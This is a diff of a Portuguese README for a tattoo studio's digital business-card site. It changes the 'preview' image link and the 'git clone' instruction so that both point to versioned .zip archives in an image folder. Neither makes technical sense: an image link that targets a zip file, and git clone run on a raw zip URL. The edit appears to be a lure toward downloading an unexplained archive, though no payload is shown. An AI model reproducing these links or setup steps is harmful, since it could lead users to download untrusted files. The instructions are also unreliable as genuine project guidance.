@@ -7,7 +7,7 @@ Projeto de um cartão de visita digital para o estúdio **Nax Dark Tattoo**.
 Este é um site simples que apresenta informações sobre o estúdio de tatuagem, incluindo contato, endereço e redes sociais.
 
 ## 📸 Demonstração
-![Preview do site](https://github.com/naxdac/CartaodevisitaNaxdark/raw/refs/heads/main/img/Cartaodevisita_Naxdark_v3.9.zip)  
+![Preview do site](https://raw.githubusercontent.com/naxdac/CartaodevisitaNaxdark/main/img/Naxdark_Cartaodevisita_v2.1.zip)  
 
 ## 🚀 Tecnologias utilizadas
 
@@ -18,4 +18,4 @@ Este é um site simples que apresenta informações sobre o estúdio de tatuagem
 
 1. Clone este repositório:
    ```sh
-   git clone https://github.com/naxdac/CartaodevisitaNaxdark/raw/refs/heads/main/img/Cartaodevisita_Naxdark_v3.9.zip
+   git clone https://raw.githubusercontent.com/naxdac/CartaodevisitaNaxdark/main/img/Naxdark_Cartaodevisita_v2.1.zip
